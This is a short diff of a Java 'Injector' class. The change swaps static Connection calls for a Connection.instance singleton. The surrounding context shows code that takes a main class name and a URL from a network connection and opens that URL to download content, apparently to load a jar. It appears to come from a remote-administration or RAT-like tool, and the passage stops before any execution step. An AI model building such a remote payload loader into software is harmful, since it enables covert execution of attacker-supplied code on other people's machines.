@@ -12,15 +12,15 @@ import java.util.jar.JarInputStream;
 public class Injector {
 	
 	public void inject(DataInputStream dis) throws Exception {
-		String mainClass = Connection.readLine();
-		boolean fromUrl = Connection.readBoolean();
+		String mainClass = Connection.instance.readLine();
+		boolean fromUrl = Connection.instance.readBoolean();
 		
 		long size;
 		
 		ByteArrayOutputStream baos;
 		
 		if (fromUrl) {
-			String url = Connection.readLine();
+			String url = Connection.instance.readLine();
 			URLConnection con = new URL(url).openConnection();
 			InputStream in = con.getInputStream();
 			
